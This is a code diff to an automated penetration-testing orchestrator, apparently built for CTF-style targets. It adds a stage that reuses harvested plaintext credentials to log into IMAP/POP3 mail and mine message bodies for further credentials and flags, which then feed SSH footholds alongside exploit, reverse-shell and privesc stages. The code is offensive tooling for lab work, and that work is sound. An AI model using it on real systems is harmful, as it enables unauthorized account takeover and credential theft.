@@ -572,6 +572,7 @@ class Orchestrator(FootholdMixin):
                 self._consider_builtin_exploit(report, host)  # 내장 익스 모듈 매칭 → PoC 조달·큐잉
                 self._exploit_run_stage(report, host)     # 3단계: PoC 실행 → 자격·발판 URL 캡처
                 self._foothold_stage(report, host)        # 웹 RCE 발판·리버스셸 → 자격수확 → 플래그
+                self._mail_harvest_stage(report, host)    # 수확 자격으로 IMAP/POP3 로그인 → 본문서 다음 자격 수확
                 self._exploit_exec_stage(report, host)    # 1단계: SSH 자격 → 플래그 → privesc
 
             # ── PHASE 3.95: AWS/S3 열거 자동 준비 (호스트명/도메인 확보 시) ──
@@ -2545,6 +2546,67 @@ class Orchestrator(FootholdMixin):
                                                     "exploit-derived", f"{user} SSH 키 로그인 후 직접 읽음")
                         self._record_flag(report, FlagHit(val, kind, "SSH키"), prov)
                 return   # 로그인 성공 — 더 시도하지 않음
+
+    def _mail_domain(self) -> str:
+        """메일 user@domain 형식용 베이스 도메인 추정 — 자동등록 vhost/hosts_map 에서.
+        'mail001.enigma.htb' 같은 3+라벨은 마지막 2라벨('enigma.htb')을 베이스로 본다."""
+        names = list(getattr(self, "_vhost_seen", None) or []) + list((self.hosts_map or {}).keys())
+        for n in names:
+            parts = (n or "").strip().split(".")
+            if len(parts) >= 2 and all(parts):
+                return ".".join(parts[-2:])
+        return ""
+
+    def _mail_harvest_stage(self, report: OrchestrationReport, host) -> None:
+        """수확한 평문 자격을 메일(IMAP/POP3)에 로그인해 본문에서 '다음 자격·플래그'를 수확한다.
+        실측(Enigma): 온보딩 PDF 자격이 webmail 계정이라 SSH 분사만으로는 발판이 안 섰다 —
+        메일 본문의 다음 자격을 world.creds 로 되먹여 이후 SSH 발판이 쓰게 한다.
+        옵트인(exploit_exec/auto_poc)·타겟 IP 한정·읽기 전용(전송 없음)."""
+        if self.world is None or self.dry_run or not (self.exploit_exec or self.auto_poc):
+            return
+        from . import mail_recon
+        from . import provenance as _prov
+        from .flag import FlagHit
+        from .target_shell import parse_cred
+        open_ports = list(host.open_ports) if (host is not None and host.open_ports) else None
+        if open_ports is not None and not mail_recon.has_mail_port(open_ports):
+            return   # 메일 포트(110/143/993/995) 신호 없으면 생략
+        import re
+        creds: list[tuple[str, str]] = []
+        for c in self.world.creds:
+            pc = parse_cred(c)
+            if not pc or pc in creds:
+                continue
+            if re.fullmatch(r"[0-9a-fA-F]{32}", pc[1]):   # NT 해시는 평문 로그인 아님
+                continue
+            creds.append(pc)
+        if not creds:
+            self.audit.event("mail_harvest_skip", reason="no_plaintext_cred")
+            return
+        ip = str(self.guard.bound_target or self.world.target)
+        imap_fn = getattr(self, "_mail_imap_fn", None) or mail_recon.imap_fetch
+        pop3_fn = getattr(self, "_mail_pop3_fn", None) or mail_recon.pop3_fetch
+        findings = mail_recon.try_mail_logins(
+            ip, creds, open_ports=open_ports, domain=self._mail_domain(),
+            fetch_imap=imap_fn, fetch_pop3=pop3_fn, flag_kind=self.flag_kind)
+        new_creds = 0
+        for fnd in findings:
+            self.audit.event("mail_login", endpoint=fnd.endpoint, msgs=fnd.msg_count,
+                             creds=len(fnd.creds), flags=len(fnd.flags))
+            for u, p in fnd.creds:
+                before = len(self.world.creds)
+                self.world.add_cred(f"{u}:{p}", source=f"메일 {fnd.endpoint}")
+                new_creds += len(self.world.creds) - before
+            for kind, val in fnd.flags:
+                prov = _prov.FlagProvenance(kind, val, f"<메일 {fnd.endpoint}>", "access",
+                                            "exploit-derived", "메일 본문에서 직접 읽음")
+                self._record_flag(report, FlagHit(val, kind, "메일"), prov)
+            if fnd.creds or fnd.flags:
+                report.manual_suggestions.append(
+                    f"# 메일 로그인 {fnd.endpoint} — 본문에서 자격 {len(fnd.creds)} · "
+                    f"플래그 {len(fnd.flags)} 수확 (제목: {', '.join(fnd.notable[:3]) or '—'})")
+        if findings and new_creds:
+            self.audit.event("mail_harvest", logins=len(findings), new_creds=new_creds)
 
     def _classify_flag(self, report: OrchestrationReport, hit, cmd: str, phase: str):
         # [S4-3(2)] 로직은 flag_assess.classify_flag 로 분리 — self.workspace/self.kb 를
